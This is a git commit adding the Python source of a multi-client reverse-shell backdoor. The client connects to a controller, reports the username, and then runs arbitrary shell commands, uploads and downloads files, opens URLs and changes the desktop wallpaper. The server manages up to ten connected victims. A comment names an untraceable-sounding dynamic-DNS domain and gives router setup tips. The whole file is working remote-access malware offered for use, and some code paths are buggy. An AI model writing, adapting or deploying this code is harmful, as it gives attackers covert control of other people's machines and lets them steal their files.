f2414496ea2be5d9d777270f239987b4e44ba4ab
Baddou Salah Eddine <sed.baddou@gmail.com>
2017-01-26 17:54:43 +0000

    multi threading clients

---
+++ client.py
@@ -0,0 +1,119 @@
+#!/usr/bin/env python
+
+
+import socket 
+import subprocess 
+import os          
+import webbrowser
+import platform
+import ctypes
+import hashlib
+
+
+
+
+
+
+
+def transfer(s,command):
+    x1,src,dst=map(str,command.split(' '))
+    if (x1=='download'):
+        if os.path.exists(src):
+            f = open(src, 'rb')
+            packet = f.read(1024)
+            while packet != '':
+                s.send(packet) 
+                packet = f.read(1024)
+            s.send('DONE')
+            f.close()
+        else: # the file doesn't exist
+            s.send('Unable to find out the file')
+        md5_cl=hashlib.md5(open(src,'rb').read()).hexdigest()
+        md5_sv=s.recv(1024)
+        if md5_sv==md5_cl :
+            s.send('md5 OK')
+        else :
+            s.send('md5 NOK')
+  
+    elif (x1=='upload'):
+        file_to_write=open(dst,'wb')
+        bits=s.recv(1024)    
+        while True: 
+            if not bits.endswith('DONE'):
+                file_to_write.write(bits)
+            elif bits.endswith('DONE'):
+                bits=bits.replace('DONE','')
+                file_to_write.write(bits)
+                file_to_write.close()
+                break
+            bits=s.recv(1024)
+        md5_cl=hashlib.md5(open(dst,'rb').read()).hexdigest()
+        md5_sv=s.recv(1024)
+        if md5_cl==md5_sv:
+            s.send('md5 OK')
+        else :
+            s.send('md5 NOK')
+          
+
+def __browse(s,command):
+
+    new = 2 
+    url=command.split(' ')[-1]
+    url="http://"+url
+    webbrowser.open(url)
+
+def change_desktop_bg(s,command):
+
+    bg_path=str(command.split(' ')[-1])
+    
+    SPI_SETDESKWALLPAPER = 20 
+    ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, bg_path , 0)
+
+        
+def connect():
+    
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    #rmdomain is the freee dynamic domain name you created for your server it should be easy to configure it just download noip client 
+    #start the client, configure your router/firewall to redirect traffic for port 8080 to your internal server and that should be it
+    
+    rmdomain='dontrace.ddns.net'
+    while True:
+    	#rhost=socket.gethostbyname(rmdomain)
+    	if s.connect_ex(('192.168.1.2',8096))==0:
+
+    		break
+    
+    CMD =  subprocess.Popen('whoami', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    s.send(CMD.stdout.read())
+    while True: 
+        
+        command=s.recv(1024)
+
+        if 'terminate' in command:
+            s.close()
+            break 
+        elif 'download' in command:            
+            transfer(s,command)
+        elif 'upload' in command:
+            transfer(s,command)
+        elif 'browse' in command:
+            __browse(s,command)
+        elif ('change_desktop_bg' in command ) and (os=='Windows'):             #BTW This is working only on windows
+            change_desktop_bg(s,command)
+        else:
+            CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            s.send(CMD.stdout.read())
+            s.send(CMD.stderr.read())
+            
+            
+
+def main ():
+    connect()
+main()
+
+
+
+
+
+
---
+++ server.py
@@ -0,0 +1,197 @@
+#!/usr/bin/env python
+
+import socket 
+import os      
+import threading
+import subprocess
+import hashlib
+import socket
+import random
+
+
+class ClientThread(threading.Thread):
+
+    def __init__(self, sockett,socks,adds,users):
+        threading.Thread.__init__(self)
+        self.sockett = sockett
+        self.socks=socks
+        self.adds=adds
+        self.users=users
+        
+
+    def run(self):
+		clientsock, addr = self.sockett.accept()
+		username=clientsock.recv(1024)
+		self.socks.append(clientsock)
+		self.adds.append(addr)
+		self.users.append(username)
+
+
+def download(conn,command):
+
+	x,src,dst=map(str,command.split(' '))
+	conn.send(command)
+	f = open(dst,'wb') 
+	bits = conn.recv(1024)
+	while bits!='': 
+		if 'Unable to find out the file' in bits:
+			print '[-] Unable to find out the file'
+			break
+		if not bits.endswith('DONE'):
+			f.write(bits)
+		
+		if bits.endswith('DONE'):
+			bits=bits.replace('DONE','')
+			f.write(bits)
+			f.close()
+			break
+		bits=conn.recv(1024)
+
+	md5_sv=hashlib.md5(open(dst,'rb').read()).hexdigest()	
+	conn.send(md5_sv)
+	if conn.recv(1024)=='md5 OK':
+		print '[+] MD5 Checksum Verified, File Downloaded Succesfully !'
+	else :
+		print '[-] MD5 Checksum Not Verified, File not Downloaded Succesfully'
+	
+	
+        
+    
+def upload(conn,command):
+
+
+	x,src,dst=map(str,command.split(' '))
+	conn.send(command)
+	file_to_send=open(src,'rb')
+	packet=file_to_send.read(1024)
+	while packet!='':
+		conn.send(packet) 
+		packet = file_to_send.read(1024)
+	conn.send('DONE')
+	file_to_send.close()
+	md5_sv=hashlib.md5(open(src,'rb').read()).hexdigest()
+	conn.send(md5_sv)
+	print md5_sv
+	if conn.recv(1024)=='md5 OK':
+		print '[+] MD5 Checksum Verified, File Uploaded Succesfully !'
+	else :
+		print '[-] MD5 Checksum not Verified !'
+
+
+def _help():
+
+
+	subprocess.call('clear',shell=True)
+	print 'To see the manual of each command type help(command) ex:help(download) , to exit this menu type exit\n' 
+	
+	while True:
+		help_command=str(raw_input('Help)'))
+		if help_command=='exit':
+			break
+		elif help_command=='help(terminate)':
+			print 'terminate ends the session'
+		elif help_command=='help(download)':
+			print 'download => downloads a file from the client machine ex: download #source #dest'
+		elif help_command=='help(upload)':
+			print 'upload => uploads a file to the client machine ex: upload #source #dest'
+		elif hel_command=='help(username)':
+			print 'username => returns the username of the client session'
+		elif hel_command=='help(browse)':
+			print 'browse => launches a web page in the client browser ex: browse www.google.com'
+		elif hel_command=='help(change_desktop_bg)':
+			print 'change_desktop_bg => changes the desktop background of the client ex : change_desktop_bg #path_of_image'
+	return
+
+def _list():
+
+	print '\nAvailable commands:'
+	print '\nupload\ndownload\nclear\nhelp\nchange_desktop_bg\nbrowse\n'	
+
+
+
+
+def connect():
+        
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.bind(('192.168.1.2', 8096))
+        s.listen(100)
+        print '[+] Listening for incoming TCP connection on port 8080'
+        threads=[]
+        socks=[]
+        users=[]
+        adds=[]
+        halt=False
+        index=-999
+        for i in range(10):
+            newthread = ClientThread(s,socks,adds,users)
+            newthread.start()
+            threads.append(newthread)
+
+        print 'To go to the menu of the manual of commands type help \n'
+        print 'To list the available commands type ?\n'
+        while True:   
+               	command=raw_input(">")	
+               	if halt :
+                    for t in threads:
+               	        t.join()
+               	    break
+               	elif command=='who':
+               		if len(adds)==0:
+               			print '[-] Nobody is connected yet'
+               		else :
+               			for i in range(len(adds)):
+               				print 'Index : ',i,'| Address : ',adds[i][0],' | Username : ',users[i]
+           
+               	elif 'select' in command:
+               		index=command.split(' ')[-1]
+               		index=int(index)		
+               	
+                elif 'terminate' in command:
+                        halt=True
+                        break
+                        socks[index].send('terminate')
+                        conn.close() 
+                        break
+                elif 'download' in command: 
+                        download(socks[index],command)
+                elif 'upload' in command:
+                        upload(socks[index],command)
+                elif 'browse' in command:
+                        socks[index].send(command)
+                        pass	
+                elif 'change_desktop_bg' in command:
+                        socks[index].send(command)
+                        pass
+                elif 'clear' in command:
+                		subprocess.call('clear',shell=True)
+                		pass
+                elif command=='help':
+                		_help()
+                elif command=='?':
+                		_list()
+                elif command=='':
+                		pass
+                else :	
+                        socks[index].send(command)
+                        print socks[index].recv(2048)
+                  
+        
+def main ():
+
+	subprocess.call('clear',shell=True)
+	
+	connect()
+
+main()
+
+
+
+
+
+
+
+
+
+
+
+
